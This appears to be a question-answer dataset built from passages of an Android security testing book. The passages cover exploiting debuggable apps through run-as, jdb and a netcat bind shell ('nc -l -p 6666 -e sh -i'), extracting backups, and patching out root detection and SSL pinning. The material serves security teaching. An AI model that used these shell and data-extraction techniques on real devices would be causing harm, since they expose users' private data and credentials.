TAR\nfile at http://nelenkov.blogspot.de/2012/06/unpacking-android-backups.html. You can use the simple one-\nliner provided in that article on the backup.ab file as shown here:\n$ dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar\n88+1 records in\n88+1 records out\n2135 bytes (2.1 kB) copied, 0.000160038 s, 13.3 MB/s\n$ tar xvf backup.tar\napps/com.mwr.example.sieve/_manifest\napps/com.mwr.example.sieve/db/database.db-journal\napps/com.mwr.example.sieve/db/database.db\napps/com.mwr.example.sieve/ef/Backup (2014-05-27 18-16-14.874).xml\nThis exposes all the application databases, any other files that reside in the application’s data directory, and the\ncontents of the application data directory on the SD card (/sdcard/Android/data/com.mwr.example.sieve/). This\nonce again emphasizes the importance of implementing encryption for files that remain on disk, even when\nthey are assumed to be protected.\nWARNING\nSome versions of openssl available in Linux distribution repositories have not been compiled with zlib\nsupport. You can find an alternative one-liner in Python at http://blog.shvetsov.com/2013/02/access-\nandroid-app-data-without-root.html; it is shown here:\n$ dd if=backup.ab bs=1 skip=24 | python -c \"import zlib,sys;\nsys.stdout.write(zlib.decompress(sys.stdin.read()))\" > backup.tar\n2135+0 records in\n2135+0 records out\n2135 bytes (2,1 kB) copied, 0,0037513 s, 569 kB/s\nYou can use a tool named Android Backup Extractor to automate this instead of using hairy one-liners. Find it at\nhttps://github.com/nelenkov/android-backup-extractor.\nIn summary, an attacker with physical access to a device can get the data that resides in an application’s private\ndata directory provided that the application allows backups.\nDebuggable Flag\nDuring development an application needs to have a flag set in its manifest to tell the OS that a debugger is\nallowed to attach to it. You can see this as an attribute in the <application> element in the manifest as\nandroid:debuggable and set it to true or false. If this attribute does not exist in the manifest, the application is\nnot debuggable as this value defaults to false. If this value is set to true, whenever this application is active in\nany form, it is looking for a UNIX socket named @jdwp-control. This socket is opened by the ADB server when\nUSB debugging is enabled.\nTo check whether an installed application is debuggable or not, in drozer use the app.package.debuggable\nmodule. This module, as shown here, finds all debuggable packages on a device:\ndz> run app.package.debuggable\n...\nPackage: com.mwr.example.sieve\nUID: 10053\nPermissions:\n- android.permission.READ_EXTERNAL_STORAGE\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.INTERNET\n...\nHaving an application that is set as debuggable is dangerous and can cause the exposure of the application’s file\nas well as the execution of arbitrary code in the context of the application. This can be especially dangerous if\nthe debuggable application holds powerful permissions or runs as a privileged user.\nIn general, applications with the debuggable flag set can be exploited with physical access to a device that has\nUSB debugging enabled. To see which applications are active and connected to the debugging @jdwp-control\nsocket, use ADB as follows:\n$ adb jdwp\n4545\n4566\nThis adb jdwp command gives the PIDs of the processes that you can debug. To map these to actual packages on\nthe device, you can use a simple combination of ps and grep:\n$ adb shell ps | grep \"4545\\|4566\"\napp_115 4545 2724 147000 22612 ffffffff 00000000 S com.mwr.dz\napp_115 4566 2724 144896 22324 ffffffff 00000000 S com.mwr.dz:remote\nThis shows that only the drozer package can actively be debugged at this time. The only reason that this shows is\nbecause the drozer service was running at the time that the device was queried. Only applications that are active\nin some way will connect to the @jdwp-control socket; you would have to manually start other debuggable\napplications that are discovered to connect to the debugger. For instance, to start the Sieve application’s main\nactivity (we saw earlier that Sieve was debuggable) you could use the following command:\n$ adb shell am start -n com.mwr.example.sieve/.MainLoginActivity\nStarting: Intent { cmp=com.mwr.example.sieve/.MainLoginActivity }\nTIP\nTo find the name of the launch activity examine the application’s manifest or use the\napp.package.launchintent module in drozer. You can also launch the main activity from drozer using the\napp.activity.start module.\nNow if you run the adb jdwp command again and find the associated packages, Sieve is available to debug:\n$ adb jdwp\n4545\n4566\n5147\n5167\n$ adb shell ps | grep \"5147\\|5167\"\napp_127 5147 2724 145400 19944 ffffffff 00000000 S\ncom.mwr.example.sieve\napp_127 5167 2724 141016 15652 ffffffff 00000000 S\ncom.mwr.example.sieve:remote\nThe easiest way to exploit a debuggable application with physical access to a device is by making use of the run-\nas binary. This binary makes it possible to execute commands as the debuggable package on the device. The run-\nas binary uses setresuid() and setresgid() to change from the “shell” user to the application’s user—as long as\nthe following conditions are met:\nThe caller is shell or root.\nThe target package does not run as system.\nThe target package is debuggable.\nTo get an interactive shell as the Sieve application user, you can use the run-as command with the full package\nname as its parameter:\n$ adb shell\nshell@android:/ $ run-as com.mwr.example.sieve\nshell@android:/data/data/com.mwr.example.sieve $\nNote that as part of the initiation of the run-as binary, the user is placed inside the target application’s private\ndata directory. You can also use the run-as binary to execute a command and return immediately:\n$ adb shell run-as com.mwr.example.sieve ls -l databases\n-rw-rw---- u0_a53 u0_a53 24576 2014-05-27 19:28 database.db\n-rw------- u0_a53 u0_a53 12824 2014-05-27 19:28 database.db-journal\nThe preceding shows the exposure of the Sieve application’s private data directory. At this point you can execute\nany command and copy the crucial application files from the device or change them to be accessible from other\napplications using chmod. The following is a one-liner that you can use to dump the database (provided that\nsqlite3 exists and is on the path) that contains the master password as well as all the data entered into Sieve:\n$ adb shell run-as com.mwr.example.sieve sqlite3 databases/database.db\n.dump\nPRAGMA foreign_keys=OFF;\nBEGIN TRANSACTION;\nCREATE TABLE android_metadata (locale TEXT);\nINSERT INTO \"android_metadata\" VALUES('en_US');\nCREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username\nTEXT,password BLOB,email );\nINSERT INTO Passwords VALUES(1,'Gmail','tyrone',X'CC0EFA591F665110CD344C\n384D48A2755291B8A2C46A683987CE13','tyrone@gmail.com');\nINSERT INTO Passwords VALUES(2,'Internet Banking','tyrone123',X'5492FBCE\n841D11EC9E610076FC302B94DBF71B59BE7E95821248374C5529514B62',\n'tyrone@gmail.com');\nCREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT );\nINSERT INTO Key VALUES('Thisismylongpassword123','1234');\nCOMMIT;\nThis shows the complete exposure of an application’s private data directory if it is debuggable. Just to reiterate\nthe point, normally on a non-rooted device the private data directory of the Sieve application is not accessible.\nAttempting to perform even a directory listing results in the following error:\nshell@android:/ $ ls -l /data/data/com.mwr.example.sieve/databases\nopendir failed, Permission denied\nWARNING\nThis technique does not work on some Android 4.1–4.3 devices because a bug existed in AOSP that\nprevented the run-as binary from being able to access /data/system/packages.list on these devices and\ncaused it to prematurely exit with the error “Package ‘com.mwr.example.sieve’ is unknown.” This was\ncaused by a permission change on this file, as explained in Chapter 6. To see the bug report, go to\nhttps://code.google.com/p/android/issues/detail?id=58373.\nAnother method of exploiting a debuggable application with physical access to the device is attaching a debugger\nto it. Attaching a debugger to an application allows complete control over the application, including the exposure\nof information being held in variables and can be extended to the execution of arbitrary code.\nYou can use ADB to expose a process that is debuggable over TCP so that it can be debugged using JDB (Java\nDebugger). Development IDEs use this technique to provide debugging information to the development\nruntime.\n$ adb forward tcp:4444 jdwp:5147\nAfter this connection has been forwarded, use jdb to connect to it:\n$ jdb -attach localhost:4444\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n>\nAt this point, you can control the flow of execution and manipulate the application in any way you please. In\ngeneral, the reason an attacker would want to exploit a debuggable application would be to get to the files being\nprotected by it. One of the most simple and reliable methods for running operating system commands as the\ndebuggable application from within jdb was explained by Jay Freeman on his blog at\nhttp://www.saurik.com/id/17. The general steps to use his method are as follows:\n1. List all threads in the application.\n> threads\nGroup system:\n(java.lang.Thread)0xc1b1db5408 <8> FinalizerWatchdogDaemon cond. waiting\n(java.lang.Thread)0xc1b1db5258 <7> FinalizerDaemon cond. waiting\n(java.lang.Thread)0xc1b1db50f0 <6> ReferenceQueueDaemon cond. waiting\n(java.lang.Thread)0xc1b1db5000 <5> Compiler cond. waiting\n(java.lang.Thread)0xc1b1db4e20 <3> Signal Catcher cond. waiting\n(java.lang.Thread)0xc1b1db4d40 <2> GC cond. waiting\nGroup main:\n(java.lang.Thread)0xc1b1addca8 <1> main running\n(java.lang.Thread)0xc1b1db8bc8 <10> Binder_2 running\n(java.lang.Thread)0xc1b1db8ad8 <9> Binder_1 running\n>\n2. Find the main thread and attach to it.\n> thread 0xc1b1addca8\n<1> main[1]\n3. Suspend the thread.\n<1> main[1] suspend\nAll threads suspended.\n4. Create a breakpoint on android.os.MessageQueue.next.\n<1> main[1] stop in android.os.MessageQueue.next\nSet breakpoint android.os.MessageQueue.next\n5. Run and cause the breakpoint to hit.\n<1> main[1] run\n>\nBreakpoint hit: \"thread=<1> main\", android.os.MessageQueue.next(), line=\n129 bci=0\nThe breakpoint should immediately occur. If it does not, then you can cause it by interacting with the\napplication in any way. Execute any operating system command:\n<1> main[1] print new java.lang.Runtime().exec(\"/data/local/tmp/busybox\nnc -l -p 6666 -e sh -i\")\nnew java.lang.Runtime().exec(\"/data/local/tmp/busybox nc -l -p 6666 -e\nsh -i\") = \"Process[pid=5853]\"\nIn this case prior to exploitation a busybox binary was uploaded to /data/local/tmp and made accessible to all\napplications. We then invoked it to run the nc utility that binds a shell to TCP port 6666. To interact with this\nshell you forward TCP port 6666 to the attached computer and then use nc on the computer. The following\nshows these steps along with proof that access to the Sieve files has been obtained:\n$ adb forward tcp:6666 tcp:6666\n$ nc localhost 6666\nsh: can't find tty fd: No such device or address\nsh: warning: won't have full job control\nu0_a53@generic:/ $ cd /data/data/com.mwr.example.sieve\nu0_a53@generic:/data/data/com.mwr.example.sieve $ ls -l\ndrwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 cache\ndrwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 databases\nlrwxrwxrwx install install 2014-05-25 07:11 lib -> /data/app-\nlib/com.mwr.example.sieve-1\nEXPLOITING DEBUGGABLE APPLICATIONS FROM ANOTHER APPLICATION WITH NO\nPERMISSIONS\nIn 2011, Nils from MWR InfoSecurity identified a vulnerability in the way that debuggable applications\nverify the debugger that they connect to. Applications that are marked as debuggable are always looking\nfor a UNIX domain socket named @jdwp-control. If this socket is found, an application connects to it and\nprovides debugging rights to the application that owns this socket. However, it was found that any\napplication could open this socket and act as a debugger to all debuggable applications on the device.\nTiming indicates that this issue was present on all Android versions 3.1 and earlier. See the discussion of\nthis issue at https://labs.mwrinfosecurity.com/blog/2011/07/07/debuggable-apps-in-android-market/.\nAs a proof of concept for checking this issue on a device running Android 2.3, you can use the\nexploit.jdwp.check module in drozer. Start this module and then open a debuggable application, such as\nSieve, as shown here:\ndz> run exploit.jdwp.check\n[+] Opened @jdwp-control\n[*] Accepting connections\n[+] com.mwr.dz connected!\n[+] Received PID = 3941\n[+] This device is vulnerable!\n[+] com.mwr.dz connected!\n[+] Received PID = 3950\n[+] This device is vulnerable!\n[+] com.mwr.example.sieve connected!\n[+] Received PID = 4003\n[+] This device is vulnerable!\n[+] com.mwr.example.sieve connected!\n[+] Received PID = 4011\n[+] This device is vulnerable!\nThese applications connect to your socket and start the transaction required to hand over debugging rights\nto drozer. These applications connect because they are both debuggable and both have some running\nprocesses belonging to them. Both of these conditions must be met in order to get a connection. To\nunderstand the reason why the drozer agent and Sieve connected twice, observe the output of ps of these\ntwo applications:\napp_109 3941 2718 148048 23904 ffffffff afd0c59c S com.mwr.dz\napp_109 3950 2718 152324 22448 ffffffff afd0c59c S com.mwr.dz:remote\napp_115 4003 2718 142656 20116 ffffffff 00000000 S com.mwr.example.\nsieve\napp_115 4011 2718 141024 15760 ffffffff 00000000 S com.mwr.example.\nsieve:remote\nThese applications connected twice because they both have two separate processes running that\nconnected. Running the same test on an Android 4.0.4 device reveals the following:\ndz> run exploit.jdwp.check\n[+] Opened @jdwp-control\n[*] Accepting connections\n[+] com.mwr.dz connected!\n[-] Did not receive PID...not vulnerable?\n[+] com.mwr.dz connected!\n[-] Did not receive PID...not vulnerable?\n[+] com.mwr.example.sieve connected!\n[-] Did not receive PID...not vulnerable?\n[+] com.mwr.example.sieve connected!\n[-] Did not receive PID...not vulnerable?\nThis shows that the processes still connected to the socket but terminated the connection when trying to\ninteract with the connection. This happened because to fix this vulnerability, code was submitted that adds\na check after a debuggable application connects to the @jdwp-control socket and tries to send it data. This\ncheck is contained in a function called socket_peer_is_trusted(), which returns a boolean value stating",
    "question": "What is the significance of the android:debuggable attribute in Android applications and how can it be exploited by an attacker with physical access to the device?",
    "summary": "The text discusses security vulnerabilities in Android applications, including the risk of secret codes being exploited via web browsers, misconfigured file permissions leading to data exposure, and issues with SSL validation and WebView interfaces. It also highlights how debuggable applications can be exploited with physical access and the use of the run-as command to gain unauthorized access to sensitive data. Additionally, it covers methods for intercepting web traffic, analyzing file permissions, and using tools like Burp Suite and drozer for security testing."
  },
  {
    "start": 41,
    "end": 42,
    "text": "whether the @jdwp-control socket was created by the shell or root user. In this instance, drozer would\nnot be running as either of these users and so the application terminated the connection. This fix was\nmade in the commit found at\nhttps://android.googlesource.com/platform/dalvik/+/d53c7efac74f2c690a86871f160a0f36fbc069ef.\nAdditional Testing Techniques\nThis section provides an overview of testing techniques and tools that you can use when tricky testing scenarios\narise. Applications that have implemented layered security measures can be very difficult to test properly\nbecause these mechanisms stand in the way. Two examples of such situations are:\nCertificate pinned connections—Having applications that “pin” their SSL connections to a specific\ncertificate is becoming more and more prevalent. Various ways exist to do this with one way being to\nperform a full match of the presented server certificate against a stored one that was bundled with the\napplication. This presents a problem if you need to proxy the application traffic and assess the security of the\nunderlying web service.\nRoot detection—This performs checks at various points in the application code that the application is not\nrunning inside an emulator or on a rooted device. Running an application on a non-rooted device may not\nallow you to test every aspect of the application; for example, the file permissions of the files inside the\napplication’s private data directory.\nThis section presents some scenarios that may arise and solutions that let you thoroughly test an application.\nPatching Applications\nOne way to disable SSL certificate-pinned connections and root detection could be to disassemble the\napplication, remove these features from the code, and then assemble the application again. One of the easiest\ntools to use to support this activity is apktool; Chapter 6 presents an overview of it. This method relies on a\nmoderate level of knowledge of the smali format. A simple “Hello World” example is provided at\nhttps://code.google.com/p/smali/source/browse/examples/HelloWorld/HelloWorld.smali and is shown here:\n.class public LHelloWorld;\n.super Ljava/lang/Object;\n.method public static main([Ljava/lang/String;)V\n.registers 2\nsget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;\nconst-string v1, \"Hello World!\"\ninvoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/\nString;)V\nreturn-void\n.end method\nTo become comfortable with smali, it is useful to look at the Java code that represents a smali function being\nexamined. This will be left as an exercise for the reader as becoming comfortable with smali is a matter of\npracticing and spending time with it.\nTake an example of an application from the Play Store that checks and displays whether a device is rooted or\nnot. You can attempt to patch it so that it always says the device is not rooted. The checks performed in this\napplication will be roughly equivalent to what you would commonly find in an application with root detection\ncode. You may use the Root Checker application (see https://play.google.com/store/apps/details?\nid=com.joeykrim.rootcheck&hl=en) for this example. Figure 7.16 shows running Root Checker on a rooted\ndevice.\nFigure 7.16 Root Checker displaying that the device is rooted\nPerforming this patching exercise on the Root Checker application involves using apktool to convert the\napplication back to smali code, searching for the functions that check for the “su” binary, and modifying them to\nfail the root check. Note that this exercise is only for testing purposes and the application will have a completely\ndifferent cryptographic signature after the code has been modified and assembled again.\nYou can use the following command-line parameters with apktool to “baksmali” this application:\n$ java -jar apktool.jar d com.joeykrim.rootcheck.apk rootcheck\nI: Baksmaling...\nI: Loading resource table...\nI: Loaded.\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /home/mahh/apktool/framework/1.apk\nI: Loaded.\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Done.\nI: Copying assets and libs...\nNow you can search for any string containing su using grep on the smali code:\n$ grep -R -i \"\\\"su\\\"\" rootcheck\nrootcheck/smali/com/a/a/aa.smali: const-string v7, \"su\"\nrootcheck/smali/com/joeykrim/rootcheck/t.smali: const-string v1, \"su\"\nUsing dex2jar and viewing the code in JD-GUI reveals that the code is heavily obfuscated. Here is the\ndecompiled Java code that relates to com/joeykrim/rootcheck/t.smali:\npackage com.joeykrim.rootcheck;\npublic final class t\n{\npublic v a = new v(this, \"sh\");\npublic v b = new v(this, \"su\");\n}\nThis is quite cryptic and hard to understand without doing further analysis. However, you may assume that it is\ntrying to do something with the “su” binary on the device, such as execute it or check if it is on the PATH. Maybe\nif you change the “su” string in this function to “nonexistent” then it will try to check or execute “nonexistent”\nand this check will fail. You can assemble the modified contents back to an APK by using apktool again:\n$ java -jar apktool.jar b rootcheck/ rootcheck-modified.apk\nI: Checking whether sources has changed...\nI: Smaling...\nI: Checking whether resources has changed...\nI: Building resources...\nI: Building apk file...\nYou must use the same signing procedure as described in Chapter 6 to sign the APK so that it can be installed on\na device:\n$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore\nmykey.keystore rootcheck-modified.apk alias_name\nEnter Passphrase for keystore:\nadding: META-INF/MANIFEST.MF\nadding: META-INF/ALIAS_NA.SF\nadding: META-INF/ALIAS_NA.RSA\nsigning: res/color/common_signin_btn_text_dark.xml\n...\nsigning: AndroidManifest.xml\nsigning: classes.dex\nsigning: resources.arsc\nERRORS SIGNING A PACKAGE\nThe correct version of jarsigner to use for signing Android applications is 1.6. Using any other version\nmay result in error messages about incorrect certificates inside the package from the PackageParser when\ninstalling it.\nThe default version of jarsigner that the system uses can be changed by performing the following\ncommand and then selecting the correct version contained in JDK 1.6:\n$ sudo update-alternatives --config jarsigner\nAfter installing the patched application and starting it, you should see that your patch worked. Figure 7.17 shows\nthat the application no longer says that the device is rooted.\nFigure 7.17 Root Checker now displaying that the device is not rooted\nThis was a simple example of how to patch an application to bypass certain conditions when testing and does\nnot constitute a vulnerability in the Root Checker application. When cross-platform frameworks like PhoneGap\n(seehttp://phonegap.com/) are used, patching out functionality may even be easier because these checks are\nperformed in JavaScript that come with the application. You can use apktool to disassemble the APK and allow\nyou to change the JavaScript to suit your needs.\nManipulating the Runtime\nPatching complicated functionality from an application can be time consuming and frustrating. However,\nanother way exists that may be less time consuming and allow greater flexibility when testing. The concept of\nruntime manipulation will be very familiar to iOS hackers. On Android, this concept may not be as important for\nassessing application security. However, there are some distinct advantages to using tools that perform runtime\npatching of applications. These tools allow the use of low-level hooks when classes and methods are loaded.\nThis means that patching the Root Checker application could have been done on the fly in memory while the\napplication was running by writing an add-on for a runtime manipulation tool.\nTwo tools stand out in this space: Cydia Substrate by Jay Freeman and Xposed Framework by rovo89 (a user of\nthe XDA Developers forum). Some typical use cases of when these tools are useful are also presented in this\nsection. A plethora of add-ons to these tools make testing of applications easier. You should explore a host of\nthese add-ons and build your own arsenal of tools that you feel are useful.\nTool: Xposed Framework\nXposed Framework was released in 2012 by a member of the XDA Developers forum named rovo89. Using root\nprivileges, it provides functionality for hooking and modifying Android applications at runtime. It has become a\nvery popular framework for the modding community, and an active community of developers is creating\nmodules that alter all kinds of system behavior attributes. You can download it from http://repo.xposed.info/;\nthe community forum is hosted at http://forum.xda-developers.com/xposed. The repository at\nhttp://repo.xposed.info/module-overview contains modules that can change the look and feel of the device in\nsome way and there are some modules that may be useful for the testing of applications as well. Xposed works\nby providing a custom app_process binary and therefore can only modify code that is a forked from Zygote; for\nexample, installed applications. This means that anything that has not been forked from Zygote is not possible\nto hook using Xposed, including native code.\nTool: Cydia Substrate\nCydia Substrate (previously known as Mobile Substrate) is a tool that was released in 2008 for Apple iOS\ndevices and became wildly popular in the jailbreaking community. Since then, a version for Android was\nreleased in 2013 and is now available for download from the Play Store or from Jay Freeman’s website at\nhttp://www.cydiasubstrate.com/. It comes in the form of an APK and it requires root privileges to function. The\nCydia Substrate application itself does not have any directly usable functionality. It merely provides the runtime\nhooking and modification functionality to other applications (also known as “extensions”). The techniques used\nfor code injection are top notch, and in our opinion this tool is technically superior to the Xposed Framework. It\ncan provide arbitrary modification of anything running on an Android device (including native code). For any\nruntime patching needs for security testing purposes, we recommend using Cydia Substrate.\nFigure 7.18 shows the Cydia Substrate application installed and running on a rooted Android device.\nFigure 7.18 The main activity of Cydia Substrate running on an Android device\nUse Case: SSL Certificate Pinning\nThe Twitter (https://twitter.com/) application development team was an early adopter of SSL certificate\npinning techniques on Android. The Twitter application does not proxy through an intercepting proxy such as\nBurp, even when the Burp CA certificate is installed on the device. This is expected behavior from a properly\ncertificate-pinned application.\nWhen the application attempts to load tweets, a toast pops up saying, “Cannot retrieve Tweets at this time.\nPlease try again later.” This is well done from a security perspective because it does not give you any clues about\nwhat the problem is. Inspecting the source code closer reveals that certificate pinning code is implemented. If\nthe need arose to assess some aspect of the underlying Twitter web API, you could go about it in various ways.\nThe first option that comes to mind is patching the certificate pinning functions out of the code using the\ntechniques explained in the previous section. However, this task can be tough. This is where runtime\nmanipulation tools work wonderfully. A Cydia Substrate extension written by iSEC Partners, named Android\nSSL TrustKiller, is available that nullifies SSL checks at application runtime. It does all of this absolutely\ntransparently using the method-hooking API from Cydia Substrate. You can download it from\nhttps://github.com/iSECPartners/Android-SSL-TrustKiller. After you install this application and then click\nRestart System (Soft) in the Cydia Substrate application, the system reboots and when it starts again all SSL\nworries are over. Figure 7.19 shows the Twitter application proxying through Burp.\nFigure 7.19 Burp is able to proxy Twitter API traffic after loading Android SSL TrustKiller\nRunning logcat while starting the Twitter application reveals that it was SSL Trust Killer that made it possible\nto proxy it. You can see the output here:\nI/SSLTrusKiller(13955): getTrustManagers() override\nI/SSLTrusKiller(13955): Hooking init in javax.net.ssl.SSLContext\nI/SSLTrusKiller(13955): init() override in javax.net.ssl.SSLContext\nI/SSLTrusKiller(13955): getTrustManagers() override\nI/SSLTrusKiller(13955): getTrustManagers() override\nI/SSLTrusKiller(13955): init() override in javax.net.ssl.SSLContext\nI/SSLTrusKiller(13955): init() override in javax.net.ssl.SSLContext\nI/SSLTrusKiller(13955): isSecure() called(org.apache.http.conn.ssl.SSLSocketFactory)\nFor extensive documentation on creating such an extension for Cydia Substrate, see\nhttp://www.cydiasubstrate.com/.\nUse Case: Root Detection\nNow look at exactly the same example as shown in the “Patching Applications” section previously. The Root\nChecker application checks whether your device is rooted and displays this status to the screen. We previously\ndisassembled the application and manually patched out these checks. However, you can also achieve this using a\nruntime manipulation tool such as Cydia Substrate.\nAn extension named RootCloak Plus on the Play Store (see https://play .google.com/store/apps/details?\nid=com.devadvance.rootcloakplus&hl=en) uses Cydia Substrate to perform exactly this task. It provides a user\ninterface where you can select which applications should not be able to see that the device is rooted by patching\nchecks for commonly known indications of root. If you add the Root Checker application to the list of\napplications that root should be hidden from, RootCloak Plus does its job and Root Checker reports “Sorry! The\ndevice does not have proper root access.”\nThe output of logcat also reveals that RootCloak was doing its job:\nI/RootCloakPlus(16529): 4 Blacklisted app: com.joeykrim.rootcheck\nI/RootCloakPlus(16529): 9 Blacklisted app: com.joeykrim.rootcheck\n...\nI/RootCloakPlus(16529): 14 Blacklisted app: com.joeykrim.rootcheck\nUse Case: Runtime Monitoring\nWhen assessing large applications, viewing what is going on under the hood of an application at runtime is\nsometimes useful. A Cydia Substrate extension named Introspy (by iSEC Partners) allows you to do exactly this.\nYou can configure it to watch a number of important aspects of an application, such as any keys going into\nencryption functions, or what is being sent in intents to other application components. Introspy provides an\neasy configuration application that allows you to select the list of watched actions and the applications to watch.\nFigure 7.20 shows the configuration application of Introspy.\nFigure 7.20 The configuration available in Introspy\nEach action discovered by Introspy will then be logged in logcat. A simple example of opening the Sieve\napplication and performing some actions reveals the following output in logcat:\nI/Introspy(23334): ### IPC ### com.mwr.example.sieve - android.content.\nContextWrapper->startService()\nI/Introspy(23334): -> Intent { cmp=com.mwr.example.sieve/.AuthService }\nW/Introspy(23334): ### FS ### com.mwr.example.sieve - java.io.FileOutput\nStream->FileOutputStream()\nW/Introspy(23334): -> !!! Read/write on sdcard: [/storage/emulated/0/And\nroid/data/com.mwr.example.sieve/files/Backup (2014-07-31 22-13-39.54).xm\nl]\nI/Introspy(23334): ### SSL ### com.mwr.example.sieve - javax.net.ssl.SSL\nContext->init()\nI/Introspy(23334): Use of a custom Trust Manager, the app may do cert.\npinning OR validate any cert\nYou can download Introspy from https://github.com/iSECPartners/Introspy-Android.\nSummary\nIn this chapter, each aspect of assessing an Android application was covered. It was shown that Android\napplications can contain many types of vulnerabilities. In addition to containing vulnerabilities that are typical\nof client-side code, Android applications can also exhibit a lot of problems that are unique to the platform. These\nproblems arise from incorrect application configurations or coding mistakes. Each aspect of an application can\nbe fine-combed by someone wishing to find vulnerabilities. This can be done using mature tools presented in\nthis chapter and using this chapter as a general assessment methodology.\nChapter 8 will allow you to apply the knowledge learnt in this chapter at a larger scale and perform assessments\non pre-installed applications on a device. Chapter 8 will also delve into leveraging vulnerabilities to gain access\nto a device like a malicious hacker would.",
    "question": "How can runtime manipulation tools like Cydia Substrate and Xposed Framework be used to bypass SSL certificate pinning and root detection in Android applications during testing?",
    "summary": "The text discusses how Android applications can be tested by disabling security features like SSL certificate pinning and root detection through methods such as patching the app's code or using runtime manipulation tools. It provides examples of how to patch specific applications like Root Checker and how to use tools like Xposed Framework and Cydia Substrate for more flexible testing. Additionally, it explains how runtime monitoring tools can help track application behavior and interactions."
  },
  {
    "start": 43,
    "end": 43,
    "text": "CHAPTER 8\nIdentifying and Exploiting Android Implementation Issues\nWith everything that you know about how Android applications can be assessed, it's time to explore how an\nattacker can use vulnerabilities in Android applications to gain access to Android devices. This chapter covers\nfinding vulnerabilities in pre-installed applications on devices and exploiting them to gain access. Imparting this\nknowledge may come across as immoral to some, but a distinct gap in knowledge exists in this field. Attacking\nphones and tablets is a valid part of security testing that should be treated no differently than testing other\ntechnologies. The more you know about how to compromise such devices, the better chance you have to secure\nthem. First, this chapter looks at ways to find vulnerabilities in devices.\nReviewing Pre-Installed Applications\nThink of the Android OS as a set of applications working together to provide functionality for the user. Each\ninstalled application has its own attack surface that can be explored. To understand the risks of each installed\napplication, you would have to reverse engineer them separately and use all techniques covered in Chapter 7.\nHowever, there are surely more focused ways to find vulnerabilities that allow the compromise of a device\nwithout reviewing each application. The aim of this section is not to find vulnerabilities that provide root access\nwhen exploited. Too much emphasis is placed on gaining root access to a device. Often root access is not\nrequired to infiltrate user data. Rather, root access is just one way of achieving this. Giving a malicious\napplication installed on a compromised device a large set of permissions will facilitate interesting post-\nexploitation tasks on a device without needing additional privileged access. Exploiting applications with\npowerful contexts on a device is a priority for a bug hunter in order to maximize return on the time investment.\nFinding these applications is explored next.\nFinding Powerful Applications\nSome applications on a device have a much higher degree of power over the OS than others. This power could\ncome through the permissions granted to them or the Linux user that they run as. A good example of a powerful\npermission that can only be granted to pre-installed applications is INSTALL_PACKAGES. It has a protection level of\nsignature|system and is defined by the android package. An application that holds this permission has the\npower to install a new package on the device. This means that it would be able to install a new package that\nrequests an arbitrary set of permissions. Exploiting an application that holds this permission could allow an\nattacker to install a new package, perhaps a Trojan.\nTo find an application that holds INSTALL_PACKAGES in drozer, you can use the app.package.list module with\ncustom permission search filters. Running this module on an emulator running Android 4.4 KitKat is shown\nhere:\ndz> run app.package.list -p android.permission.INSTALL_PACKAGES\ncom.android.packageinstaller (Package installer)\ncom.android.shell (Shell)\nRunning this same module on a Samsung Galaxy S4 running KitKat reveals the following packages holding this\npermission:\ndz> run app.package.list -p android.permission.INSTALL_PACKAGES\ncom.sec.kidsplat.installer (Kids Mode)\ncom.sec.android.app.samsungapps (Samsung Apps)\ncom.android.vending (Google Play Store)\ncom.sec.everglades (Samsung Hub)\ncom.android.shell (Shell)\ncom.samsung.android.app.assistantmenu (Assistant menu)\ncom.vodafone.vodafone360updates (Vodafone Updates)\ncom.sec.knox.containeragent (KnoxMigrationAgent)\ncom.sec.everglades.update (SamsungHub Updater)\ncom.sec.android.omc (OM Customize)\ncom.android.packageinstaller (Package installer)\ncom.sec.enterprise.knox.cloudmdm.smdms (New enrolment)\ncom.samsung.android.app.watchmanagerstub\n(com.samsung.android.app.watchmanagerstub)\ncom.sec.android.preloadinstaller (Application installer)\ncom.osp.app.signin (Samsung account)\ncom.sec.android.app.DataCreate (Automation Test)\ncom.sec.knox.knoxsetupwizardclient (KNOX SetupWizardClient)\ncom.sec.android.Kies (USB settings)\nNotice how many applications on an actual device use this dangerous permission.\nA pre-installed application can request a sharedUserId of android.uid.system in its manifest. This effectively\nsets its application UID to 1000 (system), which is a privileged context on a device. An application running as\nthe system user is able to install new applications, access any application's data directory, and manipulate the\ndevice in many other ways. Essentially, the system user is only a single privilege level away from root. You can\nfind applications that use the system UID from drozer using the app.package.list module with a filter for UID\n1000. Doing so on the KitKat emulator looks like this:\ndz> run app.package.list -u 1000\ncom.android.inputdevices (Input Devices)\nandroid (Android System)\ncom.android.settings (Settings)\ncom.android.keychain (Key Chain)\ncom.android.location.fused (Fused Location)\ncom.android.providers.settings (Settings Storage)\nPerforming this same command on a Samsung Galaxy S4 running KitKat reveals the following:\ndz> run app.package.list -u 1000\ncom.sec.android.app.bluetoothtest (BluetoothTest)\ncom.sec.factory (DeviceTest)\ncom.sec.enterprise.mdm.services.sysscope (Enterprise SysScope Service)\ncom.sec.factory.camera (Camera Test)\ncom.samsung.pickuptutorial (PickupTutorial)\ncom.sec.setdefaultlauncher (SetDefaultLauncher)\ncom.android.settings (Settings)\ncom.samsung.android.app.gestureservice (GestureService)\ncom.sec.allsharecastplayer (Screen Mirroring)\ncom.wssyncmldm (Software update)\ncom.sec.android.app.FileShareClient (Wi-Fi Direct)\ncom.android.providers.settings (Settings Storage)\ncom.sec.android.fwupgrade (AllShare Cast Dongle S/W Update)\ncom.sec.android.service.sm (SecurityManagerService)\ncom.sec.bcservice (com.sec.bcservice)\ncom.sec.android.app.popupuireceiver (PopupuiReceiver)\ncom.android.inputdevices (Input Devices)\ncom.sec.android.app.FileShareServer (Wi-Fi Direct share)\ncom.sec.android.app.sysscope (SysScope)\nandroid (Android System)\ncom.mobeam.barcodeService (Beaming Service)\ncom.sec.android.app.servicemodeapp (Service mode)\ncom.sec.android.app.mt (Mobile tracker)\ncom.android.keychain (Key Chain)\ncom.sec.android.app.nfctest 